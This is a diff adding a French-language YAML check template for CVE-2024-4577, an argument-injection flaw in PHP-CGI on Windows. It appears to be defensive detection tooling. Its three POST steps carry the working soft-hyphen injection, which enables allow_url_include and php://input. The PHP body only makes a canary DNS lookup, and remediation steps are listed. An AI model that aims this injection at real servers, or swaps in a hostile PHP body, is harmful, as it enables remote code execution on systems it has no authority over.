@@ -1,0 +1,55 @@
+id: php-cgi-4577
+name: PHPCGIChecker
+version: 2.0.0
+author: OpenCVEC
+cves: [CVE-2024-4577]
+product: PHP en mode CGI sous Windows (avant 8.1.29, 8.2.20, 8.3.8)
+description: >-
+  Exploite l'injection d'arguments PHP-CGI (tiret doux U+00AD converti en tiret par Windows) pour
+  exécuter une seule instruction : la résolution DNS du canari.
+mode: canary
+proof: Résolution DNS du canari par PHP (gethostbyname)
+sent: >-
+  POST ?%ADd+allow_url_include=1+%ADd+auto_prepend_file=php://input avec le corps
+  <?php gethostbyname('<canari>'); ?> : aucune commande, aucun fichier écrit.
+remediation:
+  - Mettre PHP à jour (8.1.29, 8.2.20, 8.3.8 ou plus).
+  - Abandonner PHP-CGI au profit de PHP-FPM ou mod_php.
+  - Sur XAMPP, commenter la ligne ScriptAlias /php-cgi/ dans httpd-xampp.conf.
+  - Relancer le check pour confirmer la correction.
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2024-4577
+  - https://github.com/php/php-src/security/advisories/GHSA-3qgc-jrrr-25jv
+tags: [php, windows]
+lab_validated: false
+lab_note: À valider sur une VM Windows (la faille dépend des pages de code Windows, pas de cible Docker Linux).
+steps:
+  - id: php-cgi-exe
+    http:
+      method: POST
+      path: "/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp%3a//input"
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: "<?php gethostbyname('{{canary.dns.p1}}'); ?>"
+    points:
+      p1: /php-cgi/php-cgi.exe
+  - id: index-php
+    http:
+      method: POST
+      path: "/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp%3a//input"
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: "<?php gethostbyname('{{canary.dns.p2}}'); ?>"
+    points:
+      p2: /index.php
+  - id: target-script
+    http:
+      method: POST
+      path: "{{target.path}}?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp%3a//input"
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: "<?php gethostbyname('{{canary.dns.p3}}'); ?>"
+    points:
+      p3: script PHP de l'URL cible
+proofs:
+  callback: true
